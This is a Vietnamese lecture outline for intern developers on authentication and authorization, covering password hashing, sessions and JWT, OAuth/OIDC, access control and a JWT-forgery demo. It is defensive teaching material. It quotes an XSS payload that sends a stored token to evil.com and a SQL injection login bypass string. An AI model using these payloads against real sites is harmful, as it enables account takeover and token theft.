# Authentication & Authorization
### Ai đang gõ cửa — và họ được phép làm gì?

> **Đối tượng:** Intern Backend + Frontend (đã biết HTTP, REST, viết được API CRUD; chưa từng tự làm login)
> **Presenter:** Truc Le — toàn bộ
> **Thời lượng:** ~45 phút + 10 phút Kahoot · ~40 slide

File này là nguồn nội dung cho slide. Slide là bản tiếng Anh của outline này, không viết lại tự do.
Nội dung rút gọn từ [spartan-khanhdo/auth-security-lecture](https://github.com/spartan-khanhdo/auth-security-lecture) cho mức Intern.

**Nguyên tắc cho mức Intern**
- Mỗi khái niệm đi kèm **một thứ intern sẽ gặp ngay tuần đầu**: response 401/403, cookie trong DevTools, chuỗi `eyJ…` trong header, nút "Login with Google".
- Vấn đề trước, định nghĩa sau. Không có RFC number, không có tên attack hiếm.
- Mỗi section kết thúc bằng **1 slide "Làm / Đừng làm"** — thứ intern mang về dùng được.
- **Cắt khỏi bản gốc:** OAuth 1.0, PKCE chi tiết, refresh token reuse detection, key rotation / JWKS, mTLS / service mesh / service-to-service, ABAC, SAML, Micronaut config, timing attack chi tiết.

---

## MỤC LỤC

0. Giới thiệu — AuthN vs AuthZ, 401 vs 403
1. Mật khẩu — lưu sao cho DB bị lộ cũng không sao
2. Giữ trạng thái đăng nhập — session cookie vs JWT
3. "Login with Google" — OAuth 2.0, OIDC, MFA ở mức khái niệm
4. Phân quyền & 4 lỗi hay gặp — RBAC, Broken Access Control, SQLi, XSS, CSRF
5. Demo — "The Forger": login server Node + sửa JWT
99. Cảm ơn + Kahoot

---

## 0. Giới thiệu

- **0.1 Vấn đề:** API `DELETE /users/42` không có kiểm tra gì → ai biết URL cũng xoá được. Mỗi request phải trả lời 2 câu hỏi.
- **0.2 AuthN vs AuthZ:** AuthN = *bạn là ai?* (password, OTP, Google). AuthZ = *bạn được làm gì?* (viewer không được xoá user). Ví von thẻ khách sạn: lễ tân kiểm CCCD (AuthN), thẻ phòng chỉ mở phòng 702 (AuthZ). AuthN luôn chạy trước.
- **0.3 401 vs 403:** `401 Unauthorized` = chưa biết bạn là ai (thực chất là "unauthenticated") → đi login. `403 Forbidden` = biết bạn là ai nhưng không cho → login lại cũng vô ích. Intern hay trả nhầm.
- **0.4 Auth nằm ở đâu trong một request:** browser → (cookie / `Authorization: Bearer …`) → middleware xác thực → handler kiểm quyền → DB. Map của cả bài: section 1–3 là AuthN, section 4 là AuthZ + lỗi.

## 1. Mật khẩu

- **1.1 Lưu plaintext:** bảng `users(email, password)` → một lần dump DB = lộ mọi password; người dùng xài lại password ở Gmail, ngân hàng. Không bao giờ lưu plaintext, kể cả "chỉ là môi trường dev".
- **1.2 Encryption ≠ hashing:** encryption 2 chiều (có key là giải được — key nằm cùng server với DB). Hashing 1 chiều: `hash("hunter2")` → không đảo ngược được. Login = hash lại input rồi so sánh. Password → **hash**, không encrypt.
- **1.3 Hash nhanh vẫn hỏng:** SHA-256/MD5 được thiết kế để *nhanh* → GPU thử ~10 tỷ lần/giây. Rainbow table: bảng tra sẵn `hash → password` cho password phổ biến. `123456` bị crack tức thì.
- **1.4 Salt:** random string riêng cho từng user, lưu cạnh hash. Cùng password `123456` → 2 hash khác nhau → rainbow table vô dụng, crack 1 user không lộ user khác.
- **1.5 Hash chậm có chủ đích:** bcrypt / Argon2 có cost factor. bcrypt cost 12 ≈ 250 ms/lần — user không thấy, attacker thử 1 tỷ lần thì mất hàng trăm năm. bcrypt tự sinh salt, salt nằm sẵn trong chuỗi `$2b$12$…`.
- **1.6 Làm / Đừng làm:** dùng `bcrypt`/`argon2` của thư viện, không tự viết · so sánh bằng hàm `compare` của thư viện, không dùng `==` · không log password, không trả hash ra API · thông báo lỗi chung "Email hoặc mật khẩu không đúng" (không nói email có tồn tại hay không).

## 2. Giữ trạng thái đăng nhập

- **2.1 HTTP không nhớ gì:** login thành công ở request 1, request 2 server không biết bạn là ai. Cần một "vé" gửi kèm mỗi request. Có 2 kiểu vé.
- **2.2 Session cookie (stateful):** server tạo `session_id` random, lưu `{session_id → user_id}` trong DB/Redis, gửi `Set-Cookie: sid=…; HttpOnly; Secure; SameSite=Lax`. Browser tự gửi cookie lại. Logout = xoá dòng session → có hiệu lực ngay. Mở DevTools → Application → Cookies để thấy.
- **2.3 JWT (stateless):** 3 phần `header.payload.signature`, mỗi phần là base64url. Payload chứa `sub`, `role`, `exp`. Server ký bằng secret; request sau chỉ cần **kiểm chữ ký**, không cần tra DB. Dán thử vào jwt.io.
- **2.4 Base64 ≠ mã hoá:** ai cũng đọc được payload. Không bao giờ để password, số thẻ, thông tin nhạy cảm trong JWT.
- **2.5 Sửa payload thì sao:** đổi `"role":"viewer"` → `"admin"` → chữ ký không khớp → `401`. Chữ ký chống *sửa*, không chống *đọc*. Bẫy đã từng xảy ra: server chấp nhận `alg: none` hoặc quên verify → luôn verify bằng thư viện, chỉ định rõ thuật toán.
- **2.6 Session vs JWT:** bảng — lưu ở đâu · tra DB mỗi request · logout ngay lập tức · phù hợp. Session: web app 1 backend, cần logout tức thì. JWT: nhiều service cần tự kiểm tra, mobile app. Nhược điểm lớn của JWT: **không thu hồi được trước `exp`**.
- **2.7 Access token ngắn + refresh token:** access token sống 15 phút (lộ thì thiệt hại ít), refresh token sống 7–30 ngày, lưu server-side, dùng để xin access token mới; logout = xoá refresh token. Không đi sâu vào rotation.
- **2.8 Lưu token ở đâu trên browser:** `localStorage` → bất kỳ script nào (kể cả script XSS) đọc được. Cookie `HttpOnly` → JavaScript không đọc được. Mặc định: cookie `HttpOnly; Secure; SameSite`. Liên kết sang XSS/CSRF ở section 4.
- **2.9 Làm / Đừng làm.**

## 3. "Login with Google"

- **3.1 Vấn đề:** app lịch muốn đọc Google Calendar của user. Cách tệ: hỏi password Google của user → app có toàn quyền, không thu hồi riêng được. Cần cách cho quyền *một phần* mà không đưa password.
- **3.2 OAuth 2.0 — 4 vai:** User (resource owner) · App (client) · Google login (authorization server) · Google Calendar API (resource server). Ví von chìa khoá valet: chìa chỉ nổ máy, không mở cốp.
- **3.3 Authorization Code flow (mức khái niệm, có animation):** app redirect user sang Google → user login + bấm "Allow" (consent, `scope=calendar.readonly`) → Google redirect về app kèm `code` → backend của app đổi `code` + `client_secret` lấy `access_token` → gọi API. Password chỉ đi tới Google. `client_secret` chỉ nằm ở backend, không bao giờ ở frontend/mobile (nhắc: SPA/mobile dùng thêm PKCE — chỉ 1 dòng).
- **3.4 OAuth là authorization, không phải login:** access token nói "app được đọc lịch", không nói "đây là ai". **OIDC** thêm `id_token` (một JWT có `sub`, `email`, `name`) → đó mới là "Login with Google". Nối lại với JWT ở section 2.
- **3.5 MFA:** 3 loại yếu tố — biết (password) · có (điện thoại, security key) · là (vân tay). 2 yếu tố *khác loại*. TOTP (Google Authenticator, mã 6 số đổi mỗi 30 s) · SMS OTP (tiện nhưng yếu: SIM swap) · Passkey (không có gì để phishing). MFA là chuyện của AuthN: khi login qua Google, Google lo MFA, app của mình không biết.
- **3.6 Làm / Đừng làm:** dùng provider/thư viện (Google, Auth0, Keycloak, Cognito) thay vì tự build OAuth server · `client_secret` chỉ ở backend, đọc từ env/secret manager · xin `scope` nhỏ nhất · kiểm tra `state` khi Google redirect về.

## 4. Phân quyền & 4 lỗi hay gặp

- **4.1 RBAC:** user → role → permission. `viewer: read` · `editor: read, write` · `admin: read, write, delete`. Code kiểm *permission*, không kiểm tên role (`can(user, "orders:delete")`, không `if role == "admin"`).
- **4.2 Ẩn nút ≠ phân quyền:** frontend ẩn nút Delete nhưng API vẫn nhận → ai có Postman/curl cũng gọi được. Mọi kiểm tra quyền phải ở backend.
- **4.3 Broken Access Control (OWASP #1):** `GET /orders/1024` → đổi thành `/orders/1025` thấy đơn của người khác (IDOR). Fix: `WHERE id = ? AND user_id = ?` — luôn kiểm *quyền sở hữu*, không chỉ kiểm "đã login".
- **4.4 SQL Injection:** `"SELECT * FROM users WHERE email = '" + email + "'"` với input `' OR '1'='1` → login không cần password. Fix: parameterized query / ORM, không bao giờ nối chuỗi.
- **4.5 XSS:** comment chứa `<script>fetch('https://evil.com?c='+localStorage.token)</script>` → chạy trên trình duyệt của người khác → đánh cắp token (nối với 2.8). Fix: framework escape mặc định (React `{}`), tránh `dangerouslySetInnerHTML`/`innerHTML`, token trong cookie `HttpOnly`.
- **4.6 CSRF:** browser tự gửi cookie → trang `evil.com` có form ẩn POST tới `bank.com/transfer` → request đi kèm cookie của user. Fix: `SameSite=Lax/Strict` + CSRF token cho form. JWT trong header `Authorization` không bị CSRF (nhưng lại dễ dính XSS) — không có lựa chọn miễn phí.
- **4.7 Checklist mang về:** 10 dòng gộp các slide "Làm / Đừng làm".

## 5. Demo — "The Forger"

Code ở `demo/` (ngoài `presentation/`): 1 server Node + TypeScript (Node 22.18+, chạy `.ts` trực tiếp), dữ liệu trong memory, JWT HS256 tự viết ~30 dòng bằng `node:crypto` để intern đọc được, bcrypt qua `bcryptjs` (pure JS, không cần build native).

- **5.1 Setup:** `cd demo && pnpm start` → server `:4000`. Endpoint: `POST /register`, `POST /login` (trả cả session cookie và JWT), `GET /me`, `GET /admin/users` (chỉ role admin), `GET /__db` (xem bảng users — thấy hash bcrypt, không thấy password).
- **5.2 Đang chạy gì:** trích `demo/src/jwt.ts` (sign / verify, chỉ chấp nhận `HS256`) và middleware `requireAuth` / `requirePermission`.
- **5.3 Đoán trước:** bảng 4 thay đổi, khán giả đoán status code trước, bấm → để lật đáp án: gọi `/me` không token (`401`) · viewer gọi `/admin/users` (`403`) · sửa payload `role: admin` giữ nguyên chữ ký (`401`) · gửi `alg: none` (`401`).
- **5.4 Live:** slide gọi thật tới `localhost:4000`, hiển thị JWT tách 3 màu, chỉnh payload trực tiếp trên slide rồi gửi → thấy `401`. Chạy song song ở terminal: `pnpm users` (xem hash), `pnpm login viewer@demo.vn`. Không có server (GitHub Pages) → slide phát lại bản ghi.
- **5.5 Vì sao sửa JWT không qua được:** server tính lại HMAC từ header + payload mới bằng secret → khác chữ ký cũ. Muốn giả được phải có secret → **secret lộ = mọi thứ lộ**: để trong env, không commit.

## 99. Cảm ơn + Kahoot

- QR Kahoot + PIN gõ trên sân khấu (giống repo load-balancer).
- Bộ câu hỏi ~10 câu mức Intern trong `presentation/notes/kahoot-questions.md` (lấy và đơn giản hoá từ `checkpoint-quiz.md` của repo gốc).
